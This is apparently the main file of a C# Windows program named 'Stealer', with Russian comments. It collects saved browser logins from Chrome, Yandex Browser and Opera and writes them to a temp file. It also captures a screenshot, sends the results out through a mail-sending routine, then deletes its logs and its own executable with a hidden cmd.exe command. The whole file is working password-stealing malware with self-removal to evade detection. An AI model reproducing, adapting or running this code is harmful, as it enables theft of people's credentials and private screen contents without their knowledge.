using System;
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.IO.Compression;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Net.Mail;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetTempPath() + "log");
            string[] browser_paths = {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex\YandexBrowser\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data"
            };
            string content = "";
            foreach (string p in browser_paths)   //идем по папкам
            {
                var pas = Passwords.ReadPass(p);
                if (File.Exists(p))                   // если файл с паролями существует, то выполняем следующие действия
                {
                    foreach (var item in pas)
                    {
                        if ((item.Item2.Length > 0) && (item.Item2.Length > 0))      // если значения логина и пароля не пустые, то заносим их в переменную
                        {
                            content += item.Item1 + " | " + item.Item2 + " : " + item.Item3 + "\r\n";
                            content += "==================\r\n";
                        }
                    }
                }
            }
            if (File.Exists(Path.GetTempPath() + @"log\Login Data"))
            {
                File.Delete(Path.GetTempPath() + @"log\Login Data");
            }
            File.WriteAllText(Path.GetTempPath() + @"log\Passwords.txt", content); // записываем пароли в файл
            var bounds = Screen.GetBounds(new Point(0, 0));
            var bmp = new Bitmap(bounds.Width, bounds.Height);
            using (var g = Graphics.FromImage(bmp))
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(Path.GetTempPath() + @"log\screenshot.bmp");
            //ZipFile.CreateFromDirectory(Path.GetTempPath() + "log", Path.GetTempPath() + "log.zip");
            MailSend.Send();
            Directory.Delete(Path.GetTempPath() + "log", true);
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
        }
        

    }
}
